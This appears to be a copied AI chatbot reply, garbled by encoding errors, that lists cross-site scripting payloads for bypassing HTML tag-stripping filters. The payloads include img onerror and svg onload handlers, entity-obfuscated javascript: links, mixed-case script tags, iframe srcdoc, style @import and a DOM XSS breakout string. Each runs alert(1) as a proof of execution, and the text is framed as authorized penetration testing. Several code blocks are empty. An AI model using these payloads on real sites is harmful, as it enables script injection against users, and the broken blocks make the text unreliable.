üîç Goal: Bypass Tag Stripping to Execute JavaScript
‚ö†Ô∏è Common Bypass Payloads to Test
1. Event Handler Injection (If partial HTML is allowed)
html
Copy
Edit
<img src=x onerror=alert(1)>
2. Encoded JavaScript URI in Links
html
Copy
Edit
<a href="javascript:alert(1)">Click me</a>
If <a> tags are allowed but javascript: is filtered, try obfuscation:

html
Copy
Edit
<a href="javas&#99;ript:alert(1)">Click me</a>
3. Mixed Case or Obfuscated Attributes
html
Copy
Edit
<IMG SRC=x ONERROR=alert(1)>
<Img SrC=x OnErRoR=alert(1)>
4. Broken/Incomplete Tags (if the parser is lenient)
html
Copy
Edit

Or:

html
Copy
Edit

5. HTML Entity/Unicode Bypass
html
Copy
Edit
<scr&#x69;pt>alert(1)</scr&#x69;pt>
Or try this:

html
Copy
Edit

6. Using srcdoc in iframe (if iframe allowed)
html
Copy
Edit
<iframe srcdoc="<script>alert(1)</script>"></iframe>
7. Style-Based XSS (rare but possible in old browsers or weak CSPs)
html
Copy
Edit
<style>@import 'javascript:alert(1)';</style>





üí• Common Bypass Techniques (For Security Testing)
Here are contextual payloads you can test, assuming you're doing this in a legally authorized pen test:

1. Image/Event Handler Injection
If user input is inserted into an HTML tag without encoding:

html
Copy
Edit
<img src="x" onerror="alert(1)">
2. Anchor tag / href JavaScript
If input is used in an anchor tag:

html
Copy
Edit
<a href="javascript:alert(1)">Click me</a>
3. SVG-based injection
If SVG is allowed:

html
Copy
Edit

4. Malformed Tag Injection
Some filters fail to catch malformed or mixed case tags:

html
Copy
Edit
<ScRipT>alert(1)</ScRipT>
5. DOM XSS
If JavaScript on the page uses .innerHTML or .document.write() with unsanitized input:

html
Copy
Edit
"><script>alert(1)</script>
Check for vulnerable client-side code that does this.

<svg><script>confirm(1)</script>
<svg/onload=alert(1)>
<svg><script xlink:href="data:,alert(1)"></script></svg>
<svg/onload=alert(1)>

